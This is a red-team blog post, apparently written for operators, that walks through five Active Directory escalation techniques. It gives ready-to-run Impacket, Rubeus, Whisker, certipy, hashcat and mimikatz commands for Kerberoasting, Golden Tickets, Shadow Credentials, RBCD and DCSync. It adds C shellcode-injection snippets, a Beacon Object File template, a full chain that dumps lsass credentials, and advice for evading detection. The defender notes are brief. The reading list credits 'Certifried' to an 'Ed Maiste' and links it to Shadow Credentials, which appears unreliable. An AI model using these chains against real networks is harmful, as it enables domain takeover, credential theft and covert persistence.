---
title: "AD Privilege Escalation Primitives: Kerberoasting, Shadow Credentials, RBCD, Injection, and BOFs"
description: "The operator's toolkit for moving from domain user to domain admin - Kerberoasting → Golden Ticket, Shadow Credentials via msDS-KeyCredentialLink, RBCD via GenericWrite, modern process injection, and Beacon Object Files that tie it all together. Theory, tradecraft, and OPSEC for each primitive."
date: 2026-04-19
difficulty: Hard
tags: [active-directory, kerberos, rbcd, shadow-credentials, injection, bof, privilege-escalation]
---

Every red-team engagement against an Active Directory environment eventually reduces to the same question: *given the access I have right now, what's my next step toward Domain Admin?* This post walks the five primitives I reach for most often - Kerberoasting, Shadow Credentials, RBCD, process injection, and Beacon Object Files - with enough depth to understand *why* each works, not just which tool to run. Chain them correctly and you can go from a spray hit to full domain compromise in under an hour.

## Primitive 1: Kerberoasting → Golden Ticket

### Theory

Kerberos Service Principal Names (SPNs) are registered on accounts that host network services. When a client wants to use a service, it asks the KDC for a **TGS (Ticket Granting Service)** ticket for that SPN. The KDC encrypts the ticket with the service account's NTLM hash. Critically: *any* authenticated user can request a TGS for *any* SPN - the KDC doesn't check if the requesting user has permission to actually talk to the service.

So if a human account (not a machine account) has an SPN registered on it, you can request its TGS, extract the encrypted blob, and crack the NTLM hash offline. Service account passwords are notoriously weak because they're often set once and forgotten.

### Execution

```bash
# List SPN accounts and request TGS for each
impacket-GetUserSPNs corp.local/j.smith:'Spring2026!' -request -outputfile tgs.txt

# Crack with hashcat - mode 13100 is Kerberos 5 TGS-REP (RC4)
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Faster: only target weak-crypto accounts
impacket-GetUserSPNs corp.local/j.smith:'Spring2026!' -request-user svc_sql
```

The default encryption type is **RC4-HMAC** (weak). Domains with "AES-only" policy emit AES256 tickets (hashcat mode 19700) - still crackable but orders of magnitude slower.

### Chain to Domain Admin

BloodHound query to find kerberoastable accounts that can reach DA:

```cypher
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p
```

If `svc_sql` can reach DA via `AdminTo` edges, cracking it ends the engagement. With the DA credential:

```bash
# Extract krbtgt
impacket-secretsdump corp.local/admin:'P@ssw0rd'@dc01 -just-dc-user krbtgt

# Forge a Golden Ticket valid for 10 years
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

The Golden Ticket survives every password rotation **except** `krbtgt` itself. Defenders often forget to reset `krbtgt` after incident response - the ticket continues working.

### OPSEC

- **Baseline**: normal domain users request TGS tickets constantly. Kerberoasting blends in *until* you request dozens of tickets in a short window. Stagger requests.
- **AES downgrade tell**: if AES is policy-enforced and a suspicious account starts getting RC4 tickets, that's a hunt signal. Use `-usersfile` to batch requests in one go rather than triggering logs repeatedly.
- **Honeypot SPNs**: mature defenders create fake SPN accounts with no services behind them. Any TGS request for one is a red flag. Enumerate the target account's `memberOf` and recent logons before roasting.

### Remediation (what defenders do)

- Migrate service accounts to **gMSA** (Group Managed Service Accounts) - passwords are managed by AD, 120-byte random, rotated every 30 days.
- Enforce AES-only.
- `krbtgt` rotation twice (not once) every 90 days.
- Deploy honeypot SPNs, alert on TGS for them.

## Primitive 2: Shadow Credentials (PKINIT via msDS-KeyCredentialLink)

### Theory

Windows Hello for Business stores a user's Windows-Hello key pair in the **`msDS-KeyCredentialLink`** attribute of their AD object. When the user authenticates, the KDC reads the attribute, validates the signed JWT, and issues a TGT via **PKINIT** (Kerberos with certificates instead of passwords).

The attribute is writable by the object's owner, anyone with `GenericWrite` / `GenericAll`, anyone with explicit `WriteProperty` on `msDS-KeyCredentialLink`, and often (by misconfiguration) broad groups like `Authenticated Users`.

If you can write to this attribute, you can add *your own* key, obtain a TGT as the target, and authenticate as them - no password, no ADCS, no certificate template required.

### Execution

```powershell
# Add a shadow credential to DC01$
Whisker.exe add /target:DC01$ /domain:corp.local
# Output: a PFX certificate + its password, plus the DeviceID GUID for cleanup

# Request a TGT via PKINIT
Rubeus.exe asktgt /user:DC01$ /certificate:<B64> /password:<pw> /ptt

# Since DC01$ has replication rights, DCSync from it
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

Linux equivalent with Impacket/certipy:

```bash
certipy-ad shadow auto -u j.smith@corp.local -p 'Spring2026!' -account DC01$
# Auto-adds the key, requests the TGT, dumps the account's NT hash, removes the key
```

### Attack Chain

```
GenericWrite on target
  → Whisker / certipy adds key to msDS-KeyCredentialLink
    → Request TGT via PKINIT
      → S4U2Self (if target is a computer) - or direct use
        → Access as target
```

Common paths to Shadow Credentials:

- `Exchange Windows Permissions` group → GenericAll on domain → any computer is a target
- Legacy helpdesk role with `WriteProperty msDS-KeyCredentialLink` on `OU=Workstations`
- Service account chain: `svc_backup` can modify `dc01$` which has replication rights

### Cleanup

Always remove your key after the engagement:

```powershell
Whisker.exe remove /target:DC01$ /devicedid:<GUID-from-add-step>
```

Left-behind keys are the loudest artifact. The DeviceID in the attribute is the smoking gun.

### Detection

- **Event 5136** (directory service object modified) where `AttributeLDAPDisplayName = msDS-KeyCredentialLink` and the modifier is not a legitimate provisioning account.
- **Event 4768** (TGT requested) with `Certificate Information` populated, on accounts that normally password-auth.
- Missing device enrollment trace in the enrollment systems' logs - a key appears in AD that never went through Intune/AutoPilot.

## Primitive 3: RBCD (Resource-Based Constrained Delegation)

### Theory

Kerberos delegation lets service A authenticate as a user to service B on that user's behalf. The old form - "unconstrained delegation" - is a well-known escalation primitive. The newer **Resource-Based Constrained Delegation** flips the trust model: the *target* resource decides who can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

If you can write to that attribute on a target (typically via `GenericWrite` or `GenericAll`), you can grant a principal you control - even a machine account you just created - permission to impersonate any user *to that target*. Then, via S4U2Self + S4U2Proxy, you obtain a ticket as Domain Admin to the target's services.

### Execution

Machine accounts can be created by any authenticated user up to `MachineAccountQuota` (default 10):

```bash
# Create a new machine account we control
impacket-addcomputer corp.local/j.smith:'Spring2026!' -computer-name 'PWN$' -computer-pass 'Pwn1234!'

# Set RBCD on the target (requires GenericWrite on TARGET$)
impacket-rbcd corp.local/j.smith:'Spring2026!' -action write -delegate-from 'PWN$' -delegate-to 'TARGET$'

# S4U2Self + S4U2Proxy to impersonate administrator to TARGET$'s CIFS service
impacket-getST corp.local/PWN$:'Pwn1234!' -spn cifs/TARGET.corp.local -impersonate administrator

export KRB5CCNAME=administrator.ccache

# Access the target as DA
impacket-psexec -k -no-pass TARGET.corp.local
```

### Chain to Domain Admin

```
Password spray → one cred
  → BloodHound shows GenericWrite on TARGET$
    → Create PWN$ (MachineAccountQuota >= 1)
      → Set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$
        → S4U2Self + S4U2Proxy as Domain Admin
          → PsExec as SYSTEM on TARGET$
            → DCSync if TARGET$ is a DC or privileged host
```

### OPSEC and Remediation

- **MachineAccountQuota = 0** breaks the whole primitive. Set it; most orgs still have the default 10.
- Protected Users / authentication silos prevent high-value accounts from being impersonated via S4U.
- Event 4741 (computer account created) where the creator isn't a provisioning account + Event 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity` is the detection.

## Primitive 4: Modern Process Injection

Once you have a foothold, you need to run capabilities without spawning obvious child processes. Process injection is how. The four techniques worth knowing:

### 4.a - CreateRemoteThread (classic, loud)

```c
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID mem = VirtualAllocEx(h, NULL, sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(h, mem, shellcode, sz, NULL);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
```

Every EDR on earth hooks `CreateRemoteThread`. It's fine for labs; don't use on real engagements.

### 4.b - APC Injection (queue, don't spawn)

Queue an Asynchronous Procedure Call to an existing thread. Fires when the thread enters an alertable wait state:

```c
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
QueueUserAPC((PAPCFUNC)shellcode_addr, hThread, 0);
```

**EarlyBird variant**: create a process suspended, inject, queue APC on its main thread, then resume - the APC fires during initialization before EDR hooks even load.

### 4.c - Thread Hijacking (no new thread)

Suspend an existing thread, overwrite its RIP/RCX to point at your code, resume:

```c
HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
SuspendThread(hT);

CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
GetThreadContext(hT, &ctx);
ctx.Rip = (DWORD64)shellcode_addr;
SetThreadContext(hT, &ctx);

ResumeThread(hT);
```

No `CreateRemoteThread` / `QueueUserAPC` API - fewer telemetry hooks fire. But `SetThreadContext` on a foreign thread is now strongly monitored too.

### 4.d - Module Stomping (look like a legit DLL)

Load a benign signed DLL into the target, then overwrite its `.text` section with your payload. The memory is already executable, already backed by a file on disk, already present in the PEB loader list. Memory scanners see a legitimate DLL.

```c
HMODULE h = LoadLibraryA("amsi.dll");  // or any signed DLL you don't need for real
// Find .text, VirtualProtect, WriteProcessMemory over it with shellcode
// Redirect execution via CreateThread with the stomped address
```

### Comparison

| Technique | Spawns thread? | Has RWX alloc? | Easy to detect |
|---|:---:|:---:|:---:|
| CreateRemoteThread | Yes | Yes | ✓ High |
| APC (EarlyBird) | No | Yes | ⚠ Medium |
| Thread Hijacking | No | Yes | ⚠ Medium-low |
| Module Stomping | No | **No** (file-backed) | ✗ Low |

## Primitive 5: Beacon Object Files - The Glue

Everything above is executed *in-process* via Beacon Object Files rather than spawning child processes. A BOF is a COFF object file loaded into the beacon's memory, executed as a function, and unloaded. No fork-and-run, no disk artifact, no process tree anomaly.

### Structure of a BOF

```c
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char* args, int len) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };

    if (KERNEL32$Process32First(snap, &pe)) {
        do {
            BeaconPrintf(CALLBACK_OUTPUT, "PID %d  %s", pe.th32ProcessID, pe.szExeFile);
        } while (KERNEL32$Process32Next(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
}
```

Key constraints:

- **No CRT.** No `printf`, `malloc`, `memcpy` from `<string.h>`. Use Windows APIs or inline.
- **No globals that persist.** The BOF is loaded and unloaded per-task.
- **No exceptions.** SEH works but is fragile; avoid.
- **One entry point**: `go(char* args, int length)`.
- **Dynamic imports**: `MODULE$function` syntax tells the beacon loader to resolve at runtime via `LoadLibrary` + `GetProcAddress`.

### Why BOFs Make the Other Primitives Safe

Ship your Kerberoasting, RBCD, injection, and Shadow Credentials code as BOFs and you get all of it:
- No fork-and-run child processes
- No on-disk payloads
- AMSI/ETW already patched before the BOF runs
- Indirect-syscall wrapper libraries integrate cleanly

Most modern red team toolkits are distributed as BOF collections - `TrustedSec/CS-Situational-Awareness-BOF`, `Outflank/C2-Tool-Collection`, `ajpc500/BOFs` - because the security benefit over fork-and-run is that significant.

Compile with:

```
cl.exe /c /GS- /W4 mybof.c
```

`/GS-` disables stack cookies (cookies reference `__security_cookie` which isn't present in BOF land).

## The Full Chain

Everything tied together, how a real engagement looks:

```
Day 0: Password spray → svc_backup:Spring2026!
Day 0: BloodHound dump → svc_backup has GenericWrite on TARGET$ (web server)
       Kerberoastable: svc_sql, svc_backup itself
       Path: svc_sql → AdminTo → WORKSTATIONS → HasSession → DA
Day 0: Request TGS for svc_sql, crack offline - hash cracks in 3 hours
Day 0: svc_sql has local admin on WORKSTATION01 which has a DA logged in
Day 1: Module-stomping injection into lsass on WORKSTATION01, dump DA creds
Day 1: DCSync → krbtgt hash
Day 1: Golden Ticket as backdoor
Day 1: Shadow Credentials on each DC via DA - for ongoing persistence
Day 1: Cleanup - remove shadow keys, delete machine accounts, log out
```

Each primitive took 10-30 minutes. The chain is the capability. Master all five and you have a template that works on most unhardened AD environments on the first day of the engagement.

## Recommended Reading

- SpecterOps "Trust Optimization" series - unconstrained and constrained delegation theory
- Elad Shamir, "Wagging the Dog" - S4U2Self / S4U2Proxy deep dive
- Ed Maiste, "Certifried" - PKINIT and Shadow Credentials
- MITRE ATT&CK T1558 (Kerberoast), T1187 (Forced Auth), T1550.003 (Ticket Abuse)

> Domain Admin isn't a goal - it's a milestone toward the actual objective. But getting there reliably with the same five primitives, on engagement after engagement, is what separates an operator from a script user.
